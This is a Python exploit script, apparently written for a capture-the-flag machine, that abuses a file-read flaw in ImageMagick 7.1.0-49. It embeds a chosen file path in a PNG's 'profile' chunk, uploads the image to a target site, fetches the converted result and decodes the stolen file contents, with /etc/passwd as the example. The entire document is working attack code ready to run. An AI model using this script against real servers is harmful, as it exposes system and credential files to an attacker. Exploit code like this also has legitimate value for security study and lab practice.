#!/bin/python3

# LFI in ImageMagick 7.1.0-49
# With the help of https://github.com/Sybil-Scan/imagemagick-lfi-poc

import sys, requests, io, os
from PIL import Image, PngImagePlugin
from colorama import Fore 

# Checks for arguments.
if len(sys.argv) < 3:
    print("[-] Arguments required!")
    print(f"[!] Usage: \tpython3 {sys.argv[0]} <URL> <FileToRead>")
    print(f"    Es.\t\tpython3 {sys.argv[0]} http://pilgrimage.htb/ /etc/passwd")
    exit()

print("\n[+] Empty PNG image generation...")
image = Image.new("RGBA", (255, 255), (0, 0, 0, 0)) # Creates a blank image of size 255x255 with transparent background

print("[+] Add payload to the image...")
info = PngImagePlugin.PngInfo()
info.add_text("profile", sys.argv[2])

print("[+] Save the image 'image.png'...")
image.save('image.png', "PNG", pnginfo=info)

print("[+] Send the image via POST...")
session = requests.Session()
response = session.get(sys.argv[1])
myfiles = {'toConvert': open('image.png', 'rb')}
response = session.post(sys.argv[1], files=myfiles, allow_redirects=False)

print("[+] Reading the content of the uploaded image after conversion...")
urlImageUploaded = response.headers.get("Location").split("&")[0][10:]
response = requests.get(urlImageUploaded)
img = Image.open(io.BytesIO(response.content))

print("[+] Clear...")
os.remove('image.png')

print("[+] OUTPUT:\n")
# Extract the raw profile type from the image metadata
raw_profile_type = img.info.get('Raw profile type', '').split("\n")[3:]
raw_profile_type_stipped = "\n".join(raw_profile_type)
# Decrypt the raw profile type from hex format
decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode()
# Print the decrypted profile type
print(Fore.GREEN + decrypted_profile_type)
